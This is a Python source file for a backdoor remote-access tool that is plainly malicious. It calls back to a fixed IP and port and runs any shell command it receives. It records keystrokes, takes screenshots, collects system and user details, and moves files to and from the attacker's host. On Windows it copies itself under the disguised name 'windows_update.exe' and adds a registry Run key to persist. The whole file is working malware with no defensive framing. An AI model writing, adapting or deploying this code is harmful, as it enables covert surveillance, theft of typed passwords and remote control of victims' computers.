import socket
import time
import subprocess
import json
import os
import sys
import shutil
import platform
import pyautogui  # For screenshot capturing
import threading
import pynput.keyboard  # For keylogger functionality

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Store keystrokes in a file
key_log_file = "keylog.txt"

# Reliable data transmission using JSON encoding
def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

# Reliable data reception using JSON decoding
def reliable_recv():
    data = ""
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue  # Continue receiving until complete JSON data is received

# Attempt to establish a persistent connection
def connection():
    while True:
        time.sleep(20)  # Wait before attempting reconnection
        try:
            s.connect(("192.168.1.12", 5555))
            shell()
            s.close()
            break
        except:
            continue  # Retry connection if it fails

# Ensure persistence on Windows by adding registry entry
def maintain_persistence():
    if platform.system() == "Windows":
        malicious_path = os.path.join(os.getenv("APPDATA"), "windows_update.exe")
        if not os.path.exists(malicious_path):
            shutil.copy(sys.executable, malicious_path)
            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d "{malicious_path}"',
                shell=True,
            )

# Upload file to the server
def upload_file(file_name):
    try:
        with open(file_name, "rb") as f:
            s.send(f.read())
    except FileNotFoundError:
        reliable_send("[!] File not found.")

# Download file from the server
def download_file(file_name):
    with open(file_name, "wb") as f:
        s.settimeout(1)
        while True:
            try:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
            except socket.timeout:
                break
        s.settimeout(None)

# Capture a screenshot and send it to the server
def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    upload_file("screenshot.png")
    os.remove("screenshot.png")

# Collect system information
def get_system_info():
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Hostname": platform.node(),
        "Username": os.getlogin(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
    }
    reliable_send(info)

# Keylogger: Record keystrokes
def keylogger_callback(key):
    with open(key_log_file, "a") as f:
        f.write(f"{key}\n")

def start_keylogger():
    key_listener = pynput.keyboard.Listener(on_press=keylogger_callback)
    key_listener.start()

# Command shell to receive and execute commands
def shell():
    start_keylogger()  # Start logging keystrokes
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command == "clear":
            pass
        elif command.startswith("cd "):
            try:
                os.chdir(command[3:])
            except FileNotFoundError:
                reliable_send("[!] Directory not found.")
        elif command.startswith("download"):
            upload_file(command[9:])
        elif command.startswith("upload"):
            download_file(command[7:])
        elif command == "screenshot":
            capture_screenshot()
        elif command == "sysinfo":
            get_system_info()
        else:
            execute = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())

# Ensure persistence
maintain_persistence()

# Initialize socket and establish connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
